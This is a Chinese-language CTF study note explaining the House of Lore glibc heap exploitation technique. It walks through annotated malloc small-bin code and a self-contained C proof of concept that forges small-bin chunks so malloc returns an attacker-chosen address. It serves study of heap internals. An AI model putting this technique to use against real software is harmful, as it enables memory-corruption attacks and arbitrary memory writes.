
title: House of Lore

date: 2018-04-16 08:15:13

categories:
- CTF
- House of Lore


## 概述

House of Lore 攻击与 Glibc 堆管理中的的 Small Bin 的机制紧密相关。

House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。

House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。

这项攻击基本上是对于small bin和large bin的伪造堆块攻击. 然而, 因为约在2007年(对`fd_nextsize`和`bk_nextsize`的引入)一个新增的对large bin的保护, 该项技术变得不再可行。这里我们只考虑small bin的情形. 首先, 一个small chunk会被放置在small bin中, 它的`bk`指针会被覆写成指向一个伪造的small chunk. **要注意的是在small bin的情况下, 插入操作发生在`首部`而移除操作发生在`尾部`**. 一次malloc调用将首先移除bin中理应存在的堆块从而致使我们的伪堆块到了bin的`尾部`. 再下一次malloc调用就会返回攻击者的堆块.

. **要注意的是在small bin的情况下, 插入操作发生在`首部`而移除操作发生在`尾部`**. 

## 基本原理

如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下

```C
    /*
       If a small request, check regular bin.  Since these "smallbins"
       hold one size each, no searching within bins is necessary.
       (For a large request, we need to wait until unsorted chunks are
       processed to find best fit. But for small ones, fits are exact
       anyway, so we can check now, which is faster.)
     */

    if (in_smallbin_range(nb)) {
        // 获取 small bin 的索引
        idx = smallbin_index(nb);
        // 获取对应 small bin 中的 chunk 指针
        bin = bin_at(av, idx);
        // 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk
        // 如果 victim = bin ，那说明该 bin 为空。
        // 如果不相等，那么会有两种情况
        if ((victim = last(bin)) != bin) {
            // 第一种情况，small bin 还没有初始化。
            if (victim == 0) /* initialization check */
                // 执行初始化，将 fast bins 中的 chunk 进行合并
                malloc_consolidate(av);
            // 第二种情况，small bin 中存在空闲的 chunk
            else {
                // 获取 small bin 中倒数第二个 chunk 。
                bck = victim->bk;
                // 检查 bck->fd 是不是 victim，防止伪造
                if (__glibc_unlikely(bck->fd != victim)) {
                    errstr = "malloc(): smallbin double linked list corrupted";
                    goto errout;
                }
                // 设置 victim 对应的 inuse 位
                set_inuse_bit_at_offset(victim, nb);
                // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
                bin->bk = bck;
                bck->fd = bin;
                // 如果不是 main_arena，设置对应的标志
                if (av != &main_arena) set_non_main_arena(victim);
                // 细致的检查
                check_malloced_chunk(av, victim, nb);
                // 将申请到的 chunk 转化为对应的 mem 状态
                void *p = chunk2mem(victim);
                // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff
                alloc_perturb(p, bytes);
                return p;
            }
        }
    }
```

从下面的这部分我们可以看出

```c
                // 获取 small bin 中倒数第二个 chunk 。
                bck = victim->bk;
                // 检查 bck->fd 是不是 victim，防止伪造
                if (__glibc_unlikely(bck->fd != victim)) {
                    errstr = "malloc(): smallbin double linked list corrupted";
                    goto errout;
                }
                // 设置 victim 对应的 inuse 位
                set_inuse_bit_at_offset(victim, nb);
                // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
                bin->bk = bck;
                bck->fd = bin;
```

如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的fake chunk，并且同时满足之后的 bck->fd != victim 的检测，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chunk。

## 例子

 [house_of_lore](https://heap-exploitation.dhavalkapil.com/assets/files/house_of_lore.c) 为例

```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

struct small_chunk {
  size_t prev_size;
  size_t size;
  struct small_chunk *fd;
  struct small_chunk *bk;
  char buf[0x64];               // chunk falls in smallbin size range
};

int main() {
  struct small_chunk fake_chunk, another_fake_chunk;
  struct small_chunk *real_chunk;
  unsigned long long *ptr, *victim;
  int len;

  printf("%p\n", &fake_chunk);

  len = sizeof(struct small_chunk);

  // Grab two small chunk and free the first one
  // This chunk will go into unsorted bin
  ptr = malloc(len);
  printf("%p\n", ptr);
  // The second malloc can be of random size. We just want that
  // the first chunk does not merge with the top chunk on freeing
  printf("%p\n", malloc(len));
  free(ptr);

  real_chunk = (struct small_chunk *)(ptr - 2);
  printf("%p\n", real_chunk);

  // Grab another chunk with greater size so as to prevent getting back
  // the same one. Also, the previous chunk will now go from unsorted to
  // small bin
  printf("%p\n", malloc(len + 0x10));

  // Make the real small chunk's bk pointer point to &fake_chunk
  // This will insert the fake chunk in the smallbin
  real_chunk->bk = &fake_chunk;
  // and fake_chunk's fd point to the small chunk
  // This will ensure that 'victim->bk->fd == victim' for the real chunk
  fake_chunk.fd = real_chunk;

  // We also need this 'victim->bk->fd == victim' test to pass for fake chunk
  fake_chunk.bk = &another_fake_chunk;
  another_fake_chunk.fd = &fake_chunk;

  // Remove the real chunk by a standard call to malloc
  printf("%p\n", malloc(len));

  // Next malloc for that size will return the fake chunk
  victim = malloc(len);
  printf("%p\n", victim);

  return 0;
}
```

需要特别小心以确保每一个将要使用malloc返回的small chunk都满足`victim->bk->fd == victim`, 以通过安全检查 ”malloc(): smallbin double linked list corrupted” 。此外也添加了额外的’malloc’调用以确保:

1. 第一个堆块在释放时会添加到unsorted bin而不是和top chunk合并
2. 第一个堆块会进入到small bin中，因为它不满足大小为`len + 0x10`的malloc申请.

## 参考

[House of Lore](https://ctf-wiki.github.io/ctf-wiki/pwn/heap/house_of_lore/)

https://vancir.com/2017/08/12/house-of-lore/

